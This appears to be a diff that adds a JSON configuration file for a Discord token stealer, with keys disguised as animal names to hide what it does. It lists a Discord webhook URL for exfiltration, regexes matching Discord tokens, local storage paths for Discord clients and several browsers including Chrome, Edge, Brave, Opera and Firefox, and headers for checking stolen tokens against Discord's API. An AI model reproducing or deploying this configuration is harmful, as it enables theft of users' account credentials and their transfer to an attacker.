@@ -1,0 +1,101 @@
+{
+  "aardvark": {
+    "baboon": "https://discord.com/api/webhooks/1483487134982737930/IgaakNSNKSqoLuUT9Ovrx_ztFKcUYpHT4609E1FOEOJ_nbKD7Sd70t-hVGvnr50xk8ok",
+    "camel": "xxxtentacion",
+    "dingo": "ggs",
+    "echidna": ":globe_with_meridians: Token:"
+  },
+  "ferret": {
+    "gazelle": "https://discord.com/api/v9",
+    "hyena": {
+      "iguana": "[\\\\w-]{24}\\.[\\\\w-]{6}\\.[\\\\w-]{25,110}",
+      "jackal": "dQw4w9WgXcQ:[^\\\"]*"
+    }
+  },
+  "koala": [
+    {
+      "lemur": "Mongoose",
+      "mandrill": "APPDATA\\discord\\Local Storage\\leveldb\\",
+      "newt": true,
+      "ocelot": "APPDATA\\{panther}\\Local State"
+    },
+    {
+      "lemur": "Narwhal",
+      "mandrill": "APPDATA\\discordcanary\\Local Storage\\leveldb\\",
+      "newt": true,
+      "ocelot": "APPDATA\\{panther}\\Local State"
+    },
+    {
+      "lemur": "Octopus",
+      "mandrill": "APPDATA\\discordptb\\Local Storage\\leveldb\\",
+      "newt": true,
+      "ocelot": "APPDATA\\{panther}\\Local State"
+    },
+    {
+      "lemur": "Penguin",
+      "mandrill": "APPDATA\\Lightcord\\Local Storage\\leveldb\\",
+      "newt": true,
+      "ocelot": "APPDATA\\{panther}\\Local State"
+    }
+  ],
+  "quokka": [
+    {
+      "rabbit": "Raccoon",
+      "salamander": "LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\",
+      "tapir": false
+    },
+    {
+      "rabbit": "Tiger",
+      "salamander": "LOCALAPPDATA\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\",
+      "tapir": false
+    },
+    {
+      "rabbit": "Urial",
+      "salamander": "LOCALAPPDATA\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\",
+      "tapir": false
+    },
+    {
+      "rabbit": "Viper",
+      "salamander": "LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\",
+      "tapir": false
+    },
+    {
+      "rabbit": "Wolf",
+      "salamander": "LOCALAPPDATA\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\",
+      "tapir": false
+    },
+    {
+      "rabbit": "Yak",
+      "salamander": "APPDATA\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\",
+      "tapir": false
+    },
+    {
+      "rabbit": "Zebra",
+      "salamander": "APPDATA\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\",
+      "tapir": false
+    },
+    {
+      "rabbit": "Ape",
+      "salamander": "LOCALAPPDATA\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\",
+      "tapir": false
+    },
+    {
+      "rabbit": "Bear",
+      "salamander": "LOCALAPPDATA\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
+      "tapir": false
+    }
+  ],
+  "armadillo": {
+    "butterfly": "Chameleon",
+    "cheetah": "APPDATA\\Mozilla\\Firefox\\Profiles\\",
+    "elephant": [".sqlite", ".db"]
+  },
+  "falcon": {
+    "gorilla": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+    "hedgehog": "Content-Type: application/json\r\n",
+    "ibis": "discord.com",
+    "jaguar": "POST",
+    "kangaroo": "/users/@me",
+    "leopard": "Authorization:"
+  }
+}
